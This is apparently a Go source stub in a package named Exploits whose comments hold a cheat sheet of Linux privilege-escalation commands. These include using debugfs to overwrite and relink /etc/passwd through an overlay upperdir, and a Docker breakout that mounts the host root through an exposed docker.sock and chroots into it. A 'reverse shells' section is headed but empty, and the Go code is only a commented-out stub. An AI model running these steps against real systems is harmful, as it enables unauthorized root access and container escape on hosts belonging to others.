// File for simple exploits that only require commandline access and some knowledge

/*/

///////////////////////////////////////////////////////////////////////////////
# test for exploit
touch /tmp/test

# begin exploiting if possible
mount | grep upperdir

OR

cat /etc/mtab | grep upperdir

#enter debugfs prompt
debugfs -w {that specific partition e.g. dev/sda5 or some shit like that}

# get blockid of /etc/passwd
debugfs> blocks /etc/passwd

#modify /etc/passwd
debugfs> zap_block -o 0 -1 20 -p 0x41 <first blockid>

# link /etc/passwd to our readable directory in tmp
# slash at the end is important
debugfs> ln /etc/passwd <upperdir>/tmp/

#
/tmp/fadv /tmp/passwd
/*/

///////////////////////////////////////////////////////////////////////////////
//reverse shells //
///////////////////

//////////////////////////////////////////////////////////////////////////////
//Docker Breakout  //
/*///////////////////
#Search the socket
find / -name docker.sock 2>/dev/null

#It's usually in /run/docker.sock

#List images to use one
docker images

#Run the image mounting the host disk and chroot on it
docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash

In case the docker socket is in an unexpected place you can
still communicate with it using the docker command with the
parameter -H unix:///path/to/docker.sock

You should check the capabilities of the container,
if it has any of the following ones, you might be able to scape from it:
CAP_SYS_ADMIN, CAP_SYS_PTRACE, CAP_SYS_MODULE, DAC_READ_SEARCH, DAC_OVERRIDE

capsh --print

/*/

package Exploits

//func run_linux_exploit(array_of_shell_commands []string) {
//}
